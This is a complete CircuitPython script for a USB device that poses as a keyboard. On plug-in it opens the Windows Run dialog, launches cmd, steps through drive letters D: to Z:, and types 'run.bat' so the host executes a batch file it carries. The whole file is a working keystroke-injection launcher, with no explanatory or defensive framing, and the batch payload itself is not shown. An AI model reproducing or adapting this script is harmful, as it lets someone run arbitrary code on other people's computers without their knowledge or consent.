#IMPORTS
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keycode import Keycode
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
import time
#SETUP
kbd = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(kbd)
lst = ["D:","E:","F:","G:","H:","I:","J:","K:","L:","M:","N:","O:","P:","Q:","R:","S:","T:","U:","V:","W:","X:","Y:","Z:"]
#MAINLOOP
time.sleep(0.675)
kbd.send(Keycode.WINDOWS,Keycode.R)
time.sleep(0.25)
layout.write('cmd\n')
time.sleep(2)
for i in lst:
	layout.write(f'{i}\n')
layout.write("run.bat\n")
